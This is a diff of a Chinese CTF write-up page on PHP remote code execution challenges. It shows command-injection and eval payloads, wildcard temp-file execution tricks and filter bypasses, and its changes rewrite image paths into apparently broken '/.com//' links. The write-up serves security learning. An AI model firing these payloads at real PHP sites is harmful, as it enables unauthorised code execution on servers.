@@ -414,12 +414,12 @@
 <h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>url&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("tac fla?.php");?> 短标签</p>
 <h2 id="4-无参数RCE"><a href="#4-无参数RCE" class="headerlink" title="4.无参数RCE"></a><strong>4.无参数RCE</strong></h2><h3 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h3><p>url&#x2F;?c&#x3D;print_r(<strong>get_defined_vars()</strong>); 获取并打印当前作用域中所有已定义的变量的数组</p>
 <p>即可自定义一个变sy量 eg:<strong>1&#x3D;phpinfo();</strong> </p>
-<p>​                  <img src="/2024/10/22/rce/24.png" alt="24">             </p>
+<p>​                  <img src="/.com//24.png" alt="24">             </p>
 <p>url&#x2F;?c&#x3D;print_r(next(<strong>get_defined_vars())</strong>);</p>
 <p><code>**next()**</code> <strong>是 PHP 中用于将数组中的内部指针向前移动并返回当前元素的函数</strong></p>
 <p><strong>url&#x2F;?c&#x3D;print_r(array_pop(next(get_defined_vars())));</strong> 弹出数组<strong>值</strong></p>
 <p><strong>url&#x2F;?c&#x3D;eval(array_pop(next(get_defined_vars()))); 执行命令</strong> </p>
-<p> <img src="/2024/10/22/rce/233.png" alt="233"></p>
+<p> <img src="/.com//233.png" alt="233"></p>
 <h2 id="5-shell-重定向操作"><a href="#5-shell-重定向操作" class="headerlink" title="5. shell 重定向操作"></a><strong>5.</strong> <strong>shell</strong> <strong>重定向操作</strong></h2><h3 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h3><p><strong>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</strong> 命令的标准输出（stdout）和标准错误（stderr）都被重定向到 &#x2F;dev&#x2F;null 即可<strong>双写绕过</strong></p>
 <p>url&#x2F;?c&#x3D;cat flag.php;ls</p>
 <p>web43 过滤分号</p>
@@ -439,15 +439,15 @@
 <p>下载下来的压缩包中包含有flag.php</p>
 <h2 id="9-web56"><a href="#9-web56" class="headerlink" title="9.web56"></a><strong>9.web56</strong></h2><p>​    自定义脚本 上传服务器进行命令执行</p>
 <p>​    自己搭建一个文件上传页面 要<strong>指定好目标ur</strong>l </p>
-<p>  <img src="/2024/10/22/rce/25.png" alt="25"></p>
+<p>  <img src="/.com//25.png" alt="25"></p>
 <p>临时文件存放目录命名规则 <strong>eg:&#x2F;tmp&#x2F;phpaaaaaX</strong>  php+五位小写字母+一位大写字母</p>
 <p>使用通配符 <strong>&#x2F;???&#x2F;????????[@-[]</strong>   ascii值 @ 到 [ 之间为<strong>大写字母</strong></p>
 <p>在文件上传页面上传并抓包</p>
 <p>修改数据包内容为<strong>命令操控脚本</strong> 一般上传txt</p>
-<p>   <img src="/2024/10/22/rce/26.png" alt="26"></p>
-<p>  <img src="/2024/10/22/rce/27.png" alt="27"></p>
+<p>   <img src="/.com//26.png" alt="26"></p>
+<p>  <img src="/.com//27.png" alt="27"></p>
 <p>响应如下 即可正常rce   </p>
-<p><img src="/2024/10/22/rce/28.png" alt="28"></p>
+<p><img src="/.com//28.png" alt="28"></p>
 <h2 id="10-web58-文件读取"><a href="#10-web58-文件读取" class="headerlink" title="10.web58 文件读取"></a><strong>10.web58</strong> <strong>文件读取</strong></h2><p><strong>echo file_get_contents(‘flag.php’);</strong></p>
 <p><strong>highlight_file(‘flag.php’);</strong></p>
 <p><strong>show_source(‘flag.php’);</strong></p>
@@ -458,9 +458,9 @@
 <p><strong>.</strong> <strong>当前目录</strong> <strong>&#x2F; 根目录</strong></p>
 <p><strong>include(‘&#x2F;flag.txt’);</strong></p>
 <p><strong>12.web 71</strong></p>
-<p> <img src="/2024/10/22/rce/29.png" alt="29"></p>
+<p> <img src="/.com//29.png" alt="29"></p>
 <p>将flag转换成？</p>
-<p> <img src="/2024/10/22/rce/30.png" alt="30"></p>
+<p> <img src="/.com//30.png" alt="30"></p>
 <p> 此时在命令后添加一个 exit(); 中断下列命令即可</p>
 <p><strong>include(‘&#x2F;flag.txt’);exit();</strong></p>
 <p><strong>include(‘&#x2F;flag.txt’);ob_flush();</strong></p>
@@ -514,25 +514,25 @@
 <p>payload:</p>
 <p>&#x2F;???&#x2F;????6? ????.???</p>
 <p>&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.???</p>
-<h2 id="20-web124"><a href="#20-web124" class="headerlink" title="20.web124"></a>20.web124</h2><p><img src="/2024/10/22/rce/image-20240426133504795.png" alt="image-20240426133504795"></p>
+<h2 id="20-web124"><a href="#20-web124" class="headerlink" title="20.web124"></a>20.web124</h2><p><img src="/.com//image-20240426133504795.png" alt="image-20240426133504795"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hexadecimal</span> = <span class="string">&#x27;a37334&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="variable">$hexadecimal</span>, <span class="number">16</span>, <span class="number">2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出：101000110111001100110100</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/10/22/rce/image-20240426133607518.png" alt="image-20240426133607518"></p>
+<p><img src="/.com//image-20240426133607518.png" alt="image-20240426133607518"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bindec</span>(<span class="string">&#x27;110011&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bindec</span>(<span class="string">&#x27;000110011&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bindec</span>(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>以上示例会输出：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">51</span><br><span class="line">51</span><br><span class="line">7</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/10/22/rce/image-20240426133650051.png" alt="image-20240426133650051"></p>
+<p><img src="/.com//image-20240426133650051.png" alt="image-20240426133650051"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decbin</span>(<span class="number">12</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decbin</span>(<span class="number">26</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>以上示例会输出：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1100</span><br><span class="line">11010</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/10/22/rce/image-20240426133727782.png" alt="image-20240426133727782"></p>
-<p><img src="/2024/10/22/rce/image-20240426133741543.png" alt="image-20240426133741543"></p>
+<p><img src="/.com//image-20240426133727782.png" alt="image-20240426133727782"></p>
+<p><img src="/.com//image-20240426133741543.png" alt="image-20240426133741543"></p>
 <h3 id="动态函数调用"><a href="#动态函数调用" class="headerlink" title="动态函数调用"></a>动态函数调用</h3><p>要使用 <code>$var&#123;func&#125;</code> 这种形式</p>
 <p> <code>$var</code> 是一个字符串，<code>&#123;func&#125;</code> 表示函数名</p>
 <p>如果直接使用 <code>$func</code>，则 PHP 引擎会将其解释为一个未定义的常量，并<strong>不会</strong>当成代码来<strong>执行</strong></p>
@@ -540,7 +540,7 @@
 <p><code>echo (&#39;system&#39;)(&#39;dir&#39;)</code>;</p>
 <p><code>?&gt;</code></p>
 <p>输出页面</p>
-<img src="/2024/10/22/rce/image-20240426135131238.png" alt="image-20240426135131238" style="zoom: 67%;">
+<img src="/.com//image-20240426135131238.png" alt="image-20240426135131238" style="zoom: 67%;">
 
 <p>在web124中，我们要<strong>在可用函数中</strong>通过<strong>数字的进制转换</strong>来<strong>构造字符串</strong></p>
 <p>最先想到的便是<strong>hex2bin</strong>因为他最终可以<strong>返回ascii值</strong>来构造字符串</p>
